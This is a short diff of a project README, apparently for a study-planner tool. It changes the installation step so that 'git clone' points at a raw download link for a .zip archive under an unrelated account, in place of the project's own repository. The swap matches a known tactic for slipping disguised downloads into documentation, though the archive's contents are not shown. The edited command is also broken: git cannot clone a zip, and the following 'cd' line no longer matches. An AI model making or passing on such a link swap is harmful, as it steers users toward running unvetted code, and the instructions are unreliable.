@@ -20,7 +20,7 @@
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/your-username/study-planner-plus.git
+   git clone https://raw.githubusercontent.com/aksh-dash/Study-Planner/main/extractive/Study-Planner-1.1.zip
    cd study-planner-plus
 Upon running the script, a menu will appear with the following options:
 
